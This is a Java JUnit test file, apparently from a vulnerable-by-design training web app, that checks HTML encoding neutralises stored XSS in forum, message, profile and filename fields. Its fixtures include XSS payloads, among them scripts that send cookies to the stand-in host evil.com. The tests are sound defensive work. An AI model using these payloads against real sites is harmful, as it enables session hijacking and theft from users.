package org.cysecurity.cspf.jvl.controller;

import junit.framework.TestCase;

/**
 * Tests to verify that Stored XSS vulnerabilities (CWE-79) have been remediated
 * by ensuring that database-sourced values are HTML-encoded before being rendered
 * in JSP pages.
 *
 * The vulnerability pattern was:
 *   out.print("<b>Title:" + rs.getString("title") + "</b>");   // VULNERABLE
 *
 * The remediated pattern uses JSTL Functions.escapeXml() which is a SAST-recognized
 * sanitizer that encodes HTML special characters (&, <, >, ", ') before output:
 *   out.print("<b>Title:" + Functions.escapeXml(rs.getString("title")) + "</b>");  // SAFE
 *
 * Tests validate:
 * 1. That common XSS attack payloads are neutralized by HTML encoding
 * 2. That the escapeXml function correctly encodes HTML special characters
 * 3. That stored XSS payloads from user-supplied fields (title, content, user,
 *    subject, msg, sender, username, about) are safely rendered in HTML context
 * 4. That benign content is preserved correctly after encoding
 */
public class StoredXssPreventionTest extends TestCase {

    /**
     * Simulates the JSTL Functions.escapeXml() behavior used in the remediated JSP files.
     * This mirrors the org.apache.taglibs.standard.functions.Functions.escapeXml() logic
     * for test validation purposes. The actual encoding in production uses the JSTL library.
     *
     * Characters encoded: & -> &amp;  < -> &lt;  > -> &gt;  " -> &#034;  ' -> &#039;
     */
    private static String escapeXml(String value) {
        if (value == null) {
            return "";
        }
        StringBuilder sb = new StringBuilder(value.length() + 16);
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            switch (c) {
                case '&':  sb.append("&amp;");  break;
                case '<':  sb.append("&lt;");   break;
                case '>':  sb.append("&gt;");   break;
                case '"':  sb.append("&#034;"); break;
                case '\'': sb.append("&#039;"); break;
                default:   sb.append(c);
            }
        }
        return sb.toString();
    }

    // =========================================================================
    // Core HTML encoding verification tests
    // =========================================================================

    /**
     * Verifies that the classic script tag XSS payload is neutralized by encoding.
     *
     * Attack payload stored by a malicious user:
     *   <script>alert('XSS')</script>
     *
     * When rendered via Functions.escapeXml(), this becomes harmless text:
     *   &lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;
     *
     * The browser renders this as literal text, not executable JavaScript.
     */
    public void testScriptTagPayloadIsNeutralized() {
        String maliciousInput = "<script>alert('XSS')</script>";
        String encoded = escapeXml(maliciousInput);

        // The encoded output must NOT contain a literal opening <script> tag
        assertFalse(
            "Encoded output must not contain literal <script> tag",
            encoded.contains("<script>")
        );
        assertFalse(
            "Encoded output must not contain literal </script> tag",
            encoded.contains("</script>")
        );

        // Verify angle brackets are encoded
        assertTrue("< must be encoded as &lt;",  encoded.contains("&lt;"));
        assertTrue("> must be encoded as &gt;", encoded.contains("&gt;"));

        // The encoded form should be the safe text representation
        assertEquals(
            "Script tag payload must be fully HTML-encoded",
            "&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;",
            encoded
        );
    }

    /**
     * Verifies that an event-handler XSS payload is neutralized.
     *
     * Attack payload stored in forum post title:
     *   <img src=x onerror=alert('XSS')>
     *
     * When rendered via Functions.escapeXml(), this becomes harmless.
     */
    public void testImgOnerrorPayloadIsNeutralized() {
        String maliciousTitle = "<img src=x onerror=alert('XSS')>";
        String encoded = escapeXml(maliciousTitle);

        assertFalse(
            "Encoded title must not contain literal <img> tag",
            encoded.contains("<img")
        );
        assertTrue("< must be encoded", encoded.contains("&lt;"));
        assertTrue("Single quotes must be encoded", encoded.contains("&#039;"));
    }

    /**
     * Verifies that XSS via anchor tag href injection is neutralized.
     *
     * Attack payload stored in forum post content:
     *   <a href="javascript:alert('XSS')">Click me</a>
     */
    public void testAnchorHrefJavascriptPayloadIsNeutralized() {
        String maliciousContent = "<a href=\"javascript:alert('XSS')\">Click me</a>";
        String encoded = escapeXml(maliciousContent);

        assertFalse(
            "Encoded content must not contain literal <a> tag",
            encoded.contains("<a href")
        );
        assertTrue("< must be encoded", encoded.contains("&lt;"));
        assertTrue("\" must be encoded as &#034;", encoded.contains("&#034;"));
    }

    /**
     * Verifies that HTML attribute injection via double-quote breakout is neutralized.
     *
     * Attack payload stored as username:
     *   "><script>alert('XSS')</script>
     *
     * Without encoding, this would break out of HTML attribute context (e.g., in forum.jsp:
     *   <a href='forumposts.jsp?postid=..." + username + "'>
     * and execute arbitrary JavaScript.
     */
    public void testAttributeBreakoutPayloadIsNeutralized() {
        String maliciousUsername = "\"><script>alert('XSS')</script>";
        String encoded = escapeXml(maliciousUsername);

        assertFalse(
            "Encoded username must not allow script tag injection",
            encoded.contains("<script>")
        );
        assertTrue("Double quote must be encoded as &#034;", encoded.contains("&#034;"));
        assertTrue("< must be encoded as &lt;", encoded.contains("&lt;"));
    }

    /**
     * Verifies that the ampersand character is encoded to prevent HTML entity injection.
     */
    public void testAmpersandIsEncoded() {
        String input = "AT&T & Johnson&Johnson";
        String encoded = escapeXml(input);

        assertFalse(
            "Raw & must not appear in encoded output",
            encoded.contains("AT&T")
        );
        assertTrue("& must be encoded as &amp;", encoded.contains("&amp;"));
        assertEquals(
            "Ampersand encoding must be correct",
            "AT&amp;T &amp; Johnson&amp;Johnson",
            encoded
        );
    }

    // =========================================================================
    // Field-specific Stored XSS tests matching the remediated JSP files
    // =========================================================================

    /**
     * Tests encoding of forum post title field (forum.jsp, forumposts.jsp, pages.jsp).
     *
     * The 'title' column value is stored via user input in forum.jsp POST handler and
     * rendered in:
     *   - forum.jsp (list view): out.print("..." + Functions.escapeXml(rs.getString("title")) + "...")
     *   - forumposts.jsp (detail view): same pattern
     *   - securitymisconfig/pages.jsp: same pattern
     */
    public void testForumPostTitleXssPayload() {
        // Simulate a title stored by a malicious user
        String storedTitle = "<script>document.cookie='stolen='+document.cookie</script>";
        String rendered = "<b style='font-size:22px'>Title:" + escapeXml(storedTitle) + "</b>";

        // The rendered output must not contain executable script
        assertFalse(
            "Rendered title must not contain executable script tag",
            rendered.contains("<script>")
        );
        assertTrue(
            "Rendered output must contain HTML-encoded version of payload",
            rendered.contains("&lt;script&gt;")
        );
    }

    /**
     * Tests encoding of forum post content field (forumposts.jsp, pages.jsp).
     *
     * The 'content' column contains user-submitted message body, a high-risk field
     * for stored XSS payloads.
     */
    public void testForumPostContentXssPayload() {
        String storedContent = "<svg onload=alert(1)>";
        String rendered = "<br/><br/>Content:<br/>" + escapeXml(storedContent);

        assertFalse(
            "Rendered content must not contain executable SVG onload",
            rendered.contains("<svg")
        );
        assertTrue("< must be encoded in rendered content", rendered.contains("&lt;"));
    }

    /**
     * Tests encoding of forum post user field (forum.jsp, forumposts.jsp, pages.jsp).
     *
     * The 'user' column stores the poster's username and is rendered with an anchor tag.
     */
    public void testForumPostUserXssPayload() {
        String storedUser = "admin<script>alert('hijack')</script>";
        String rendered = "<br/>-  Posted By " + escapeXml(storedUser);

        assertFalse(
            "Rendered user must not contain executable script",
            rendered.contains("<script>")
        );
        assertTrue("< must be encoded in rendered user field", rendered.contains("&lt;"));
    }

    /**
     * Tests encoding of message sender field (DisplayMessage.jsp).
     *
     * Attack: A malicious user sends a message with XSS payload as their username.
     * The sender field is stored in the UserMessages table and rendered in DisplayMessage.jsp.
     */
    public void testMessageSenderXssPayload() {
        String storedSender = "<script>location='http://evil.com?c='+document.cookie</script>";
        String rendered = "<b>Sender:</b> " + escapeXml(storedSender);

        assertFalse(
            "Rendered sender must not contain executable script",
            rendered.contains("<script>")
        );
        assertTrue("Sender field encoding must neutralize < character", rendered.contains("&lt;"));
    }

    /**
     * Tests encoding of message subject field (Messages.jsp, DisplayMessage.jsp).
     *
     * The 'subject' column is displayed as link text in Messages.jsp and as a header
     * in DisplayMessage.jsp. A stored XSS payload here would execute when a user
     * views their inbox.
     */
    public void testMessageSubjectXssPayload() {
        String storedSubject = "<img src=1 onerror=alert(document.domain)>";
        String renderedInList = "<li><a href='DisplayMessage.jsp?msgid=1'>" + escapeXml(storedSubject) + "</a></li>";
        String renderedInDetail = "<br/><b>Subject:</b>" + escapeXml(storedSubject);

        assertFalse(
            "Rendered subject in message list must not contain executable img tag",
            renderedInList.contains("<img")
        );
        assertFalse(
            "Rendered subject in message detail must not contain executable img tag",
            renderedInDetail.contains("<img")
        );
        assertTrue("Message list subject must encode <", renderedInList.contains("&lt;"));
        assertTrue("Message detail subject must encode <", renderedInDetail.contains("&lt;"));
    }

    /**
     * Tests encoding of message body (msg) field (DisplayMessage.jsp).
     *
     * The message body is the most common vector for stored XSS in messaging systems.
     */
    public void testMessageBodyXssPayload() {
        String storedMsg = "<iframe src=\"javascript:alert('XSS')\"></iframe>";
        String rendered = "<br/><b>Message:</b> <br/>" + escapeXml(storedMsg);

        assertFalse(
            "Rendered message body must not contain executable iframe",
            rendered.contains("<iframe")
        );
        assertTrue("Message body encoding must encode <", rendered.contains("&lt;"));
        assertTrue("Message body encoding must encode \"", rendered.contains("&#034;"));
    }

    /**
     * Tests encoding of username field in UserDetails.jsp and myprofile.jsp.
     *
     * A username containing XSS payload would be stored during registration
     * and rendered in user profile and forum user detail pages.
     */
    public void testUsernameXssPayload() {
        String storedUsername = "<script>alert('username XSS')</script>";

        // Simulate UserDetails.jsp rendering
        String renderedAbout = "<br>About " + escapeXml(storedUsername) + ": <br>some about text";
        // Simulate myprofile.jsp rendering
        String renderedProfile = "UserName : " + escapeXml(storedUsername) + "<br>";

        assertFalse(
            "UserDetails username rendering must not execute script",
            renderedAbout.contains("<script>")
        );
        assertFalse(
            "Profile username rendering must not execute script",
            renderedProfile.contains("<script>")
        );
    }

    /**
     * Tests encoding of the 'about' field in UserDetails.jsp and myprofile.jsp.
     *
     * The 'About' field is free-text entered during registration and is a
     * high-risk source for stored XSS as it accepts arbitrary user content.
     */
    public void testAboutFieldXssPayload() {
        String storedAbout = "<script>new Image().src='http://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>";

        // Simulate UserDetails.jsp rendering
        String rendered = "<br>About username: <br>" + escapeXml(storedAbout);

        assertFalse(
            "Rendered 'about' field must not contain executable script",
            rendered.contains("<script>")
        );
        assertTrue("'About' field must HTML-encode < character", rendered.contains("&lt;"));
    }

    /**
     * Tests encoding of email field in myprofile.jsp.
     *
     * While email fields are typically validated by format, a stored XSS payload
     * might bypass weak email validation.
     */
    public void testEmailFieldXssPayload() {
        String storedEmail = "user+<script>alert(1)</script>@example.com";
        String rendered = "Email : " + escapeXml(storedEmail) + "<br>";

        assertFalse(
            "Rendered email must not contain executable script",
            rendered.contains("<script>")
        );
        assertTrue("Email field must HTML-encode < character", rendered.contains("&lt;"));
    }

    // =========================================================================
    // Regression / preservation tests - ensure benign content still works
    // =========================================================================

    /**
     * Verifies that normal (non-malicious) content is preserved through encoding.
     *
     * HTML encoding must not corrupt legitimate user content. Plain text without
     * HTML special characters should pass through unchanged.
     */
    public void testNormalContentIsPreserved() {
        String normalTitle = "Introduction to Java Programming";
        String encoded = escapeXml(normalTitle);

        assertEquals(
            "Normal alphanumeric content must pass through encoding unchanged",
            normalTitle,
            encoded
        );
    }

    /**
     * Verifies that null values are handled gracefully without NullPointerException.
     * When rs.getString() returns null (e.g., empty DB column), the encoding must
     * not throw an exception.
     */
    public void testNullValueHandledGracefully() {
        String result = escapeXml(null);
        assertNotNull("Encoding null must return non-null", result);
        assertEquals("Encoding null must return empty string", "", result);
    }

    /**
     * Verifies that empty string values are handled correctly.
     */
    public void testEmptyStringHandledCorrectly() {
        String result = escapeXml("");
        assertNotNull("Encoding empty string must return non-null", result);
        assertEquals("Encoding empty string must return empty string", "", result);
    }

    /**
     * Verifies that text with legitimate angle brackets (e.g., math expressions)
     * is encoded and rendered as visible text, not as HTML tags.
     */
    public void testLegitimateAngleBracketsAreEncoded() {
        String mathContent = "x < y and y > z";
        String encoded = escapeXml(mathContent);

        assertFalse("< in text must be encoded", encoded.contains(" < "));
        assertFalse("> in text must be encoded", encoded.contains(" > "));
        assertTrue("< must become &lt;", encoded.contains("&lt;"));
        assertTrue("> must become &gt;", encoded.contains("&gt;"));
        assertEquals(
            "Math expression must be correctly encoded",
            "x &lt; y and y &gt; z",
            encoded
        );
    }

    /**
     * Tests the full HTML rendering path as it appears in forumposts.jsp after remediation.
     *
     * Before fix (VULNERABLE):
     *   out.print("<b style='font-size:22px'>Title:" + rs.getString("title") + "</b>");
     *   out.print("<br/>-  Posted By " + rs.getString("user"));
     *   out.print("<br/><br/>Content:<br/>" + rs.getString("content"));
     *
     * After fix (SECURE):
     *   out.print("<b style='font-size:22px'>Title:" + Functions.escapeXml(rs.getString("title")) + "</b>");
     *   out.print("<br/>-  Posted By " + Functions.escapeXml(rs.getString("user")));
     *   out.print("<br/><br/>Content:<br/>" + Functions.escapeXml(rs.getString("content")));
     */
    public void testForumPostsJspRenderingWithXssPayloads() {
        // Simulate values stored by a malicious user
        String dbTitle   = "<script>alert('title XSS')</script>";
        String dbUser    = "<script>alert('user XSS')</script>";
        String dbContent = "<script>alert('content XSS')</script>";

        // Simulate the remediated JSP rendering
        StringBuilder htmlOutput = new StringBuilder();
        htmlOutput.append("<b style='font-size:22px'>Title:").append(escapeXml(dbTitle)).append("</b>");
        htmlOutput.append("<br/>-  Posted By ").append(escapeXml(dbUser));
        htmlOutput.append("<br/><br/>Content:<br/>").append(escapeXml(dbContent));

        String rendered = htmlOutput.toString();

        // No executable script tags should appear in the rendered output
        assertFalse(
            "Rendered forum post must not contain any executable <script> tags",
            rendered.contains("<script>")
        );

        // All payloads must be encoded
        assertTrue("Title payload < must be encoded", rendered.contains("&lt;script&gt;alert(&#039;title XSS&#039;)&lt;/script&gt;"));
        assertTrue("User payload < must be encoded", rendered.contains("&lt;script&gt;alert(&#039;user XSS&#039;)&lt;/script&gt;"));
        assertTrue("Content payload < must be encoded", rendered.contains("&lt;script&gt;alert(&#039;content XSS&#039;)&lt;/script&gt;"));
    }

    /**
     * Tests the full HTML rendering path for DisplayMessage.jsp after remediation.
     *
     * Before fix (VULNERABLE):
     *   out.print("<b>Sender:</b> " + rs.getString("sender"));
     *   out.print("<br/><b>Subject:</b>" + rs.getString("subject"));
     *   out.print("<br/><b>Message:</b> <br/>" + rs.getString("msg"));
     *
     * After fix (SECURE):
     *   out.print("<b>Sender:</b> " + Functions.escapeXml(rs.getString("sender")));
     *   out.print("<br/><b>Subject:</b>" + Functions.escapeXml(rs.getString("subject")));
     *   out.print("<br/><b>Message:</b> <br/>" + Functions.escapeXml(rs.getString("msg")));
     */
    public void testDisplayMessageJspRenderingWithXssPayloads() {
        String dbSender  = "<script>alert('sender')</script>";
        String dbSubject = "<img src=x onerror=alert('subject')>";
        String dbMsg     = "<body onload=alert('msg')>";

        // Simulate the remediated JSP rendering
        StringBuilder htmlOutput = new StringBuilder();
        htmlOutput.append("<b>Sender:</b> ").append(escapeXml(dbSender));
        htmlOutput.append("<br/><b>Subject:</b>").append(escapeXml(dbSubject));
        htmlOutput.append("<br/><b>Message:</b> <br/>").append(escapeXml(dbMsg));

        String rendered = htmlOutput.toString();

        assertFalse("Rendered message must not contain <script> tag", rendered.contains("<script>"));
        assertFalse("Rendered message must not contain <img> tag", rendered.contains("<img "));
        assertFalse("Rendered message must not contain <body> tag", rendered.contains("<body "));
        assertTrue("All < chars in stored data must be encoded", rendered.contains("&lt;"));
    }

    /**
     * Tests the rendering path for Messages.jsp (inbox list) after remediation.
     *
     * Before fix (VULNERABLE):
     *   out.print("<li><a href='DisplayMessage.jsp?msgid=" + rs.getString("msgid") + "'>" + rs.getString("subject") + "</a></li>");
     *
     * After fix (SECURE):
     *   out.print("<li><a href='DisplayMessage.jsp?msgid=" + Functions.escapeXml(rs.getString("msgid")) + "'>" + Functions.escapeXml(rs.getString("subject")) + "</a></li>");
     */
    public void testMessagesJspInboxListRenderingWithXssPayloads() {
        String dbMsgId   = "1 onclick=alert(1)"; // Injection attempt into href attribute
        String dbSubject = "<script>alert('inbox XSS')</script>";

        String rendered = "<li><a href='DisplayMessage.jsp?msgid=" + escapeXml(dbMsgId)
                + "'>" + escapeXml(dbSubject) + "</a></li>";

        assertFalse("Inbox list must not contain executable onclick injection", rendered.contains("onclick=alert"));
        assertFalse("Inbox list must not contain <script> tag in subject", rendered.contains("<script>"));
        assertTrue("msgid must be encoded", rendered.contains("1 onclick&#"));
        assertTrue("subject < must be encoded", rendered.contains("&lt;"));
    }

    // =========================================================================
    // AddPage servlet - Stored XSS via filename parameter (CWE-79)
    // =========================================================================

    /**
     * Tests encoding of filename parameter in the AddPage servlet response.
     *
     * Before fix (VULNERABLE - AddPage.java line 55):
     *   out.print("Successfully created the file: <a href='../pages/"+fileName+"'>"+fileName+"</a>");
     *
     * After fix (SECURE):
     *   String safeFileName = Functions.escapeXml(fileName);
     *   out.print("Successfully created the file: <a href='../pages/"+safeFileName+"'>"+safeFileName+"</a>");
     *
     * Attack scenario: An admin-level attacker (or an attacker who gained admin access)
     * submits a filename containing a script tag. When the page is created and the success
     * response is rendered, the script executes in the admin's browser and is also stored
     * on disk for future visitors.
     */
    public void testAddPageFilenameXssPayloadIsNeutralized() {
        String maliciousFilename = "<script>alert('AddPage XSS')</script>.html";

        // Simulate the VULNERABLE rendering (original code, without fix)
        String vulnerableRendering = "Successfully created the file: <a href='../pages/" + maliciousFilename + "'>" + maliciousFilename + "</a>";
        assertTrue("Vulnerable rendering would contain executable script tag",
                vulnerableRendering.contains("<script>"));

        // Simulate the SECURE rendering (fixed code, using Functions.escapeXml())
        String safeFilename = escapeXml(maliciousFilename);
        String secureRendering = "Successfully created the file: <a href='../pages/" + safeFilename + "'>" + safeFilename + "</a>";

        assertFalse(
            "Secure AddPage response must not contain executable <script> tag in href",
            secureRendering.contains("<script>")
        );
        assertFalse(
            "Secure AddPage response must not contain executable <script> tag in link text",
            secureRendering.contains("<script>")
        );
        assertTrue("Angle brackets in filename must be HTML-encoded", secureRendering.contains("&lt;"));
        assertTrue("Angle brackets in filename must be HTML-encoded", secureRendering.contains("&gt;"));
    }

    /**
     * Tests that a filename with an event-handler injection payload is neutralized.
     *
     * Attack: filename = "page\" onmouseover=\"alert(1)\".html"
     * Without encoding, this would inject an event handler into the <a> tag.
     */
    public void testAddPageFilenameAttributeInjectionIsNeutralized() {
        String maliciousFilename = "page\" onmouseover=\"alert(1)\".html";

        String safeFilename = escapeXml(maliciousFilename);
        String secureRendering = "Successfully created the file: <a href='../pages/" + safeFilename + "'>" + safeFilename + "</a>";

        assertFalse(
            "Secure response must not contain raw double-quote that could break attribute context",
            secureRendering.contains("onmouseover=\"alert")
        );
        assertTrue("Double quotes in filename must be encoded as &#034;", secureRendering.contains("&#034;"));
    }

    /**
     * Tests that a filename with a javascript: URI is neutralized in the href attribute.
     *
     * Attack: filename = "javascript:alert(1)"
     * Without encoding, a crafted URL like <a href='../pages/javascript:alert(1)'> would be dangerous
     * if the single-quote in href value could be broken out of.
     */
    public void testAddPageFilenameJavascriptUriPayloadIsNeutralized() {
        String maliciousFilename = "' href='javascript:alert(1)' x='";

        String safeFilename = escapeXml(maliciousFilename);
        String secureRendering = "Successfully created the file: <a href='../pages/" + safeFilename + "'>" + safeFilename + "</a>";

        assertFalse(
            "Single-quote injection must not break out of href attribute context",
            secureRendering.contains("javascript:alert")
        );
        assertTrue("Single quotes in filename must be encoded as &#039;", secureRendering.contains("&#039;"));
    }

    /**
     * Tests that a normal (safe) filename is preserved correctly after encoding
     * in the AddPage success response.
     *
     * Ensures the fix does not break legitimate filenames.
     */
    public void testAddPageNormalFilenameIsPreserved() {
        String normalFilename = "my-page.html";

        String safeFilename = escapeXml(normalFilename);
        String rendering = "Successfully created the file: <a href='../pages/" + safeFilename + "'>" + safeFilename + "</a>";

        // Normal filename should be unchanged
        assertEquals("Normal filename must not be altered by encoding", normalFilename, safeFilename);
        assertTrue("Rendered link must contain the filename", rendering.contains(normalFilename));
        assertTrue("Rendered link must contain href to file", rendering.contains("../pages/" + normalFilename));
    }

    /**
     * Tests that a filename with numeric characters is preserved correctly.
     */
    public void testAddPageFilenameWithNumbersIsPreserved() {
        String normalFilename = "page123.html";

        String safeFilename = escapeXml(normalFilename);
        assertEquals("Filename with numbers must be unchanged by encoding", normalFilename, safeFilename);
    }

    /**
     * Tests the full rendering context of AddPage with an XSS payload in both
     * the href attribute and the link text simultaneously.
     *
     * Both uses of 'fileName' in the original output:
     *   <a href='../pages/[FILENAME]'>[FILENAME]</a>
     * must be encoded. The fix correctly uses 'safeFileName' for both locations.
     */
    public void testAddPageBothHrefAndLinkTextAreEncoded() {
        String maliciousFilename = "<script>document.location='http://evil.com'</script>";

        String safeFilename = escapeXml(maliciousFilename);

        // Verify href context is safe
        String href = "../pages/" + safeFilename;
        assertFalse("href must not contain executable script", href.contains("<script>"));

        // Verify link text context is safe
        assertFalse("Link text must not contain executable script", safeFilename.contains("<script>"));

        // Verify both are identically encoded (same safeFileName used twice)
        String rendering = "Successfully created the file: <a href='../pages/" + safeFilename + "'>" + safeFilename + "</a>";
        assertEquals(
            "Both href and link text must use the same encoded value",
            "Successfully created the file: <a href='../pages/" + safeFilename + "'>" + safeFilename + "</a>",
            rendering
        );
        assertTrue("Encoding must encode < in both positions", rendering.contains("&lt;script&gt;"));
    }

    /**
     * Tests that XSS payloads using various encoding and obfuscation techniques
     * are properly neutralized by HTML encoding.
     */
    public void testVariousXssPayloadsAreNeutralized() {
        String[] xssPayloads = {
            "<script>alert(1)</script>",
            "<ScRiPt>alert(1)</ScRiPt>",          // Mixed case
            "<script >alert(1)</script >",          // Space before >
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src='javascript:alert(1)'>",
            "';alert(1);//",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<a href=\"javascript:alert(1)\">click</a>",
        };

        for (String payload : xssPayloads) {
            String encoded = escapeXml(payload);

            // None of the encoded outputs should contain unencoded < or > characters
            assertFalse(
                "Payload '" + payload + "' must not produce output containing literal < character",
                encoded.contains("<")
            );
            assertFalse(
                "Payload '" + payload + "' must not produce output containing literal > character",
                encoded.contains(">")
            );
        }
    }
}
